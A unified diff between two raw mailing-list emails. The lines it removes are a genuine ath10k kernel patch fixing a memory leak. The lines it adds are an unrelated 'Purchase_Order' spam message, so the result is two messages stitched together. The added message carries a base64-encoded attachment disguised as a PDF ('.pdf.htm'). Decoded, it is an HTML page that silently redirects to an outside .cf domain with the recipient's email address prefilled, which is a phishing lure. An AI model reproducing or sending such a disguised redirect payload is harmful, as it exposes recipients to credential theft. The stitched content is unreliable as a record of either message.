@@ -1,14 +1,16 @@
 Return-path: <ath10k-bounces+kvalo=adurom.com@lists.infradead.org>
-Received: from smtp.codeaurora.org ([198.145.29.96])
+Received: from hwsrv-615549.hostwindsdns.com ([104.168.254.158]
+ helo=contact0.voxhost.cf)
  by bombadil.infradead.org with esmtps (Exim 4.92.2 #3 (Red Hat Linux))
- id 1iI7BA-0006l6-4O
- for ath10k@lists.infradead.org; Wed, 09 Oct 2019 08:18:41 +0000
-From: Miaoqing Pan <miaoqing@codeaurora.org>
-Subject: [PATCH 2/2] ath10k: fix memory leak for tpc_stats_final
-Date: Wed,  9 Oct 2019 16:18:09 +0800
-Message-Id: <1570609089-22071-2-git-send-email-miaoqing@codeaurora.org>
-In-Reply-To: <1570609089-22071-1-git-send-email-miaoqing@codeaurora.org>
-References: <1570609089-22071-1-git-send-email-miaoqing@codeaurora.org>
+ id 1iIB7W-0003MX-RP
+ for ath10k@lists.infradead.org; Wed, 09 Oct 2019 12:31:12 +0000
+From: "purchase@wenzhoultd.com" <info@voxhost.cf>
+Subject: Re: Purchase_Order_00726
+Date: 09 Oct 2019 05:20:59 -0700
+Message-ID: <20191009052058.728514B19F25628E@voxhost.cf>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+ boundary="----=_NextPart_000_0012_A257384A.FE80D941"
 List-Id: <ath10k.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/ath10k>,
  <mailto:ath10k-request@lists.infradead.org?subject=unsubscribe>
@@ -17,43 +19,52 @@ List-Post: <mailto:ath10k@lists.infradead.org>
 List-Help: <mailto:ath10k-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/ath10k>,
  <mailto:ath10k-request@lists.infradead.org?subject=subscribe>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
 Sender: "ath10k" <ath10k-bounces@lists.infradead.org>
 Errors-To: ath10k-bounces+kvalo=adurom.com@lists.infradead.org
 To: ath10k@lists.infradead.org
-Cc: linux-wireless@vger.kernel.org, Miaoqing Pan <miaoqing@codeaurora.org>
 
-The memory of ar->debug.tpc_stats_final is reallocated every debugfs
-reading, it should be freed in ath10k_debug_destroy() for the last
-allocation.
+This is a multi-part message in MIME format.
 
-Tested HW: QCA9984
-Tested FW: 10.4-3.9.0.2-00035
+------=_NextPart_000_0012_A257384A.FE80D941
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-Signed-off-by: Miaoqing Pan <miaoqing@codeaurora.org>
----
- drivers/net/wireless/ath/ath10k/debug.c | 1 +
- 1 file changed, 1 insertion(+)
 
-diff --git a/drivers/net/wireless/ath/ath10k/debug.c b/drivers/net/wireless/ath/ath10k/debug.c
-index 40baf25..04c50a2 100644
---- a/drivers/net/wireless/ath/ath10k/debug.c
-+++ b/drivers/net/wireless/ath/ath10k/debug.c
-@@ -2532,6 +2532,7 @@ void ath10k_debug_destroy(struct ath10k *ar)
- 	ath10k_debug_fw_stats_reset(ar);
- 
- 	kfree(ar->debug.tpc_stats);
-+	kfree(ar->debug.tpc_stats_final);
- }
- 
- int ath10k_debug_register(struct ath10k *ar)
--- 
-1.9.1
+My partner is out of office but instructed me to send you final=20
+purchase order for completion. please check and reply as soon as=20
+possible.
 
+--
+
+Best Regards
+
+purchase@wenzhoultd.com
+Whatsapp: +86280042991
+WeChat: +86280042991
+------=_NextPart_000_0012_A257384A.FE80D941
+Content-Type: text/html; name="PO_00726_Complete_Order.pdf.htm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PO_00726_Complete_Order.pdf.htm"
+
+PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlv
+bmFsLy9FTiINCg0KImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRy
+YW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkv
+eGh0bWwiPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRl
+bnQ9InRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xIiAvPg0KPG1ldGEgaHR0cC1lcXVp
+dj0iUkVGUkVTSCJjb250ZW50PSIxO3VybD1odHRwczovL2xpdmUtb3dlLWZpbGVzLmNmL293
+ZS9paS8/ZW1haWw9YXRoMTBrQGxpc3RzLmluZnJhZGVhZC5vcmciPg0KPHRpdGxlPkRvY3Vt
+ZW50PC90aXRsZT4NCjwvaGVhZD4NCg0KPGJvZHk+
+
+------=_NextPart_000_0012_A257384A.FE80D941
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 ath10k mailing list
 ath10k@lists.infradead.org
 http://lists.infradead.org/mailman/listinfo/ath10k
+
+------=_NextPart_000_0012_A257384A.FE80D941--
